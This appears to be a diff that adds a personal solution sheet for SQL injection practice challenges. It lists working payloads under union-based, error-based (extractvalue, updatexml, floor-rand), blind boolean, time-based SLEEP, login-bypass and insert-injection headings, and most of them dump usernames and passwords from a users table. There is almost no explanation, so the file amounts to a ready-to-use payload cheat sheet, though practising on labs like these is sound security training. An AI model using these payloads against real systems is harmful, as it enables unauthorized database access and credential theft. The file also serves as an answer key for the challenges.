@@ -1,0 +1,213 @@
+leetime
+leetime sql
+
+challenge 1:
+
+' -- -  selected columns 3
+
+ 
+
+INJECTION:' union select null,username,password from users -- -
+
+ 
+
+challenge2:
+
+injection: union select null,concat(password,':', username) ,null,null from users
+
+ 
+
+challenge3:
+
+"union select null,concat(password,'; pass is: ', username),null,null,null from users-- -
+
+ 
+
+challenge4:
+
+injection:  ') union select null,concat(password,'; pass is: ', username),null,null from users-- -
+
+ 
+
+ 
+
+DEATH
+
+challenge 1:" -1 UNION+SELECT+1,group_concat(username,' : ',password),3,4,5+from+users-- -"
+
+ 
+
+Chal2: 
+
+ 
+
+ 
+
+-1%20 )) UNION SELECT null,group_concat(USERNAME,' : ',PASSWORD) FROM users%20%20 -- -
+
+ 
+
+challenge3:
+
+-1" union select 1,2,3,group_concat(password," : ",username),null from users --+-
+
+ 
+
+challenge4 :
+
+order by 7
+
+-1") union select 1,2,3,group_concat(password," ; ",username) ,5,6,7 from users -- -
+
+ 
+
+ 
+
+XPATH INJECTION:
+
+challenge 1: 1))%20 and extractvalue(0x0a ,concat(0x0a,(select group_concat(username, " ; ",password) from users ))) -- -
+
+ 
+
+challenge 2 :
+
+1) and extractvalue(0x0a,concat(0x0a,(select group_concat(password, " : ", username) from users))) -- --- -
+
+ 
+
+ 
+
+challenge3:
+
+and updatexml(0x0a,concat(0x0a,user()),0x0a)
+
+ 
+
+ 
+
+Dual
+
+challenge 1 :5 columns
+
+) and (select 1 from (Select count(*),Concat(( select username from users limit 1,1),0x3a,floor(rand (0) *2))y from users group by y ) x) -- -
+
+ 
+
+chal2:
+
+")and (select 3 from (Select count(*),Concat(( select username from users limit 1,1),0x3a,floor(rand (0) *2))y from users group by y ) x) -- - -- -
+
+ 
+
+chal3:
+
+') and (select 3 from (Select count(*),Concat(( select username from users limit 1,1),0x3a,floor(rand (0) *2))y from users group by y ) x) -- ---
+
+ 
+
+ 
+
+chal 4
+
+ 
+
+ 
+
+blind luck:
+
+chal1:
+
+first  check the lenght of the password :
+
+'))+and+(select length(password) from users where username="injector")>3-- -
+
+ 
+
+second check the first charactere
+
+'))+and+Ascii(substring((select password from users where username="injector" limit 0,1),4,1))>109-- -
+
+ 
+
+ 
+
+chal 2:
+
+'and+ Ascii(Substring((select%20 password from users where username="decompiler" limit 0,1),1,1))>105-- -
+
+ 
+
+chal3
+
+ 
+
+1 ) and false -- -
+
+chal4:
+
+")and true-- -
+
+chal5:
+
+"))and false-- -
+
+ 
+
+sweet delay
+
+ 
+
+1) first check the length of the password :
+
+3 and IF ((select length(password) from users where username='admin')>5, SLEEP(15),0)-- -
+
+after check the letter of the pass:
+
+3 and IF ( Ascii(Substring((select%20 password from users where username="decompiler" limit 0,1),1,1))>104 , SLEEP(15),0) -- -
+
+ 
+
+2)1 'and if (1=1,sleep(10),0)-- -
+
+3) 3 "and Isleep(15)-- -
+
+4)3) and sleep(15)-- -
+
+5)3") and sleep(15)-- -
+
+ 
+
+ 
+
+ 
+
+LOGIN
+
+1) ' or 1=1-- -
+
+2)" or 1=1-- -
+
+3)') or 1=1 -- -
+
+4)") or 1=1 -- -
+
+xpath:
+
+1)") or 1=1-- -
+
+2)') or 1=1-- -
+
+3)' or 1=1-- -
+
+4)" or 1=1-- -
+
+blind:
+1)  ') or true -- -
+2)" or true -- -
+3)  ") or true -- -
+4) ' or true -- -
+
+Insert query inj:
+
+basic injection:
+1)') -- -
